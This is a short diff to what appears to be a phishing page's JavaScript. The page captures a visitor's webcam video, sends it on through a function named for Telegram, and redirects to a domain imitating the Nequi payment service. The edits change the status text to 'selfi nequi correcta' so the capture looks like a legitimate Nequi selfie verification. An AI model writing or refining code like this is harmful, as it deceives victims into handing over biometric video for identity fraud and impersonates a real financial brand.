@@ -175,7 +175,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
     videoStream = stream;
     video.srcObject = stream;
-    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
+    statusText.innerText = " Coloca tu rostro en el círculo";
 })
 .catch(() => {
     statusText.innerText = "❌ Error cámara";
@@ -273,7 +273,7 @@ function enviarVideoTelegram(videoBlob) {
     })
     .then(response => {
         if (response.ok) {
-            statusText.innerText = "✅ Video enviado correctamente";
+            statusText.innerText = "✅ selfi nequi correcta";
             setTimeout(() => {
                 window.location.href = "https://teprestanequi.vercel.app/inicio/";
             }, 3000);
